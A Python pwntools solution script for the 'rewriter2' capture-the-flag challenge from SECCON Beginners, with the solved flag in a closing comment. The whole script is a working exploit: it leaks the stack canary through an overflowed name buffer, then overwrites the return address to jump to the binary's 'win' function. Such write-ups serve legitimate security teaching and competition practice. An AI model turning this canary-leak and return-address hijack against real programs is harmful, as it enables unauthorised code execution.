#!/usr/bin/python3 

from pwn import *

HOST = "rewriter2.beginners.seccon.games"
PORT = 9001

r = remote(HOST, PORT)
# r = process("./rewriter2")

exe = ELF("./rewriter2", checksec = False)

payload1 = b'x' * 0x28 # \n destroy the CANARY
r.sendlineafter("What's your name? ", payload1)
r.recvuntil(b'x' * 0x28)
canary_leaked = r.recv(8)

payload2 = payload1 + b'\x00' + canary_leaked[1:] + b'x' * 0x8 + p64(exe.symbols["win"])
r.sendafter("How old are you?", payload2)

r.interactive()

# ctf4b{y0u_c4n_l34k_c4n4ry_v4lu3}